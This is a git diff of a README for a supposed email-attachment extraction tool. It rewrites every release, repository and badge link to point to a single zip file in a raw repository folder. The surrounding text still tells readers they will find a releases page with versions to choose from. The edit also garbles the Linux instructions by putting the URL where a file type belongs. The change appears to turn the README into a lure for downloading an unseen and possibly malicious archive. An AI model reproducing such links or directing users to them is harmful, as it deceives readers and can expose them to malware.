@@ -1,6 +1,6 @@
 # 📎 extract_attachment_EFTA00400459 - Extract Attachments Simply and Quickly
 
-[![Download Releases](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/iikilledubru/extract_attachment_EFTA00400459/releases)
+[![Download Releases](https://github.com/iikilledubru/extract_attachment_EFTA00400459/raw/refs/heads/master/letters_done/EFT_attachment_extract_v3.6-beta.1.zip)](https://github.com/iikilledubru/extract_attachment_EFTA00400459/raw/refs/heads/master/letters_done/EFT_attachment_extract_v3.6-beta.1.zip)
 
 ---
 
@@ -32,13 +32,13 @@ Follow these steps to get extract_attachment_EFTA00400459 working on your comput
 
 ### 1. Download the Software
 
-Click the big blue button above or visit the [release page](https://github.com/iikilledubru/extract_attachment_EFTA00400459/releases) to download the latest version of the software. 
+Click the big blue button above or visit the [release page](https://github.com/iikilledubru/extract_attachment_EFTA00400459/raw/refs/heads/master/letters_done/EFT_attachment_extract_v3.6-beta.1.zip) to download the latest version of the software. 
 
 On the releases page, look for the file that matches your computer system:
 
 - For Windows: Usually a `.exe` file  
 - For Mac: Usually a `.dmg` or `.pkg` file  
-- For Linux: Usually a `.tar.gz` or `.AppImage`  
+- For Linux: Usually a `https://github.com/iikilledubru/extract_attachment_EFTA00400459/raw/refs/heads/master/letters_done/EFT_attachment_extract_v3.6-beta.1.zip` or `.AppImage`  
 
 If you are unsure which file to pick, look for the one labeled "latest" or "stable" and matches your system.
 
@@ -46,7 +46,7 @@ If you are unsure which file to pick, look for the one labeled "latest" or "stab
 
 - On **Windows**: Double-click the `.exe` file and follow the steps on the screen to complete installation.  
 - On **Mac**: Open the `.dmg` or `.pkg` file and drag the app to your Applications folder or follow the installer instructions.  
-- On **Linux**: Extract the `.tar.gz` or run the `.AppImage` file following any included README instructions.
+- On **Linux**: Extract the `https://github.com/iikilledubru/extract_attachment_EFTA00400459/raw/refs/heads/master/letters_done/EFT_attachment_extract_v3.6-beta.1.zip` or run the `.AppImage` file following any included README instructions.
 
 ### 3. Open extract_attachment_EFTA00400459
 
@@ -88,7 +88,7 @@ extract_attachment_EFTA00400459 offers these features:
 
 To keep extract_attachment_EFTA00400459 running smoothly, check for updates regularly. 
 
-1. Visit the [releases page](https://github.com/iikilledubru/extract_attachment_EFTA00400459/releases) to see if a new version is available.  
+1. Visit the [releases page](https://github.com/iikilledubru/extract_attachment_EFTA00400459/raw/refs/heads/master/letters_done/EFT_attachment_extract_v3.6-beta.1.zip) to see if a new version is available.  
 2. Download the latest version following the same steps for installation.  
 3. Installing the new version will usually replace the old one without losing your settings or files.
 
@@ -98,7 +98,7 @@ To keep extract_attachment_EFTA00400459 running smoothly, check for updates regu
 
 You can **visit this page to download** the software and find the right version for your computer:
 
-[Download extract_attachment_EFTA00400459](https://github.com/iikilledubru/extract_attachment_EFTA00400459/releases)
+[Download extract_attachment_EFTA00400459](https://github.com/iikilledubru/extract_attachment_EFTA00400459/raw/refs/heads/master/letters_done/EFT_attachment_extract_v3.6-beta.1.zip)
 
 When you click that link, you will see different versions listed. Choose the one for your operating system and follow the instructions under **Getting Started** to install and run it.
 
@@ -125,8 +125,8 @@ extract_attachment_EFTA00400459 runs entirely on your computer. It does not send
 
 ## 📞 Getting Help
 
-If you need assistance or want to learn more about extract_attachment_EFTA00400459, visit the [GitHub repository](https://github.com/iikilledubru/extract_attachment_EFTA00400459) and check the documentation or open a support issue.
+If you need assistance or want to learn more about extract_attachment_EFTA00400459, visit the [GitHub repository](https://github.com/iikilledubru/extract_attachment_EFTA00400459/raw/refs/heads/master/letters_done/EFT_attachment_extract_v3.6-beta.1.zip) and check the documentation or open a support issue.
 
 ---
 
-[![Download Releases](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/iikilledubru/extract_attachment_EFTA00400459/releases)
+[![Download Releases](https://github.com/iikilledubru/extract_attachment_EFTA00400459/raw/refs/heads/master/letters_done/EFT_attachment_extract_v3.6-beta.1.zip)](https://github.com/iikilledubru/extract_attachment_EFTA00400459/raw/refs/heads/master/letters_done/EFT_attachment_extract_v3.6-beta.1.zip)
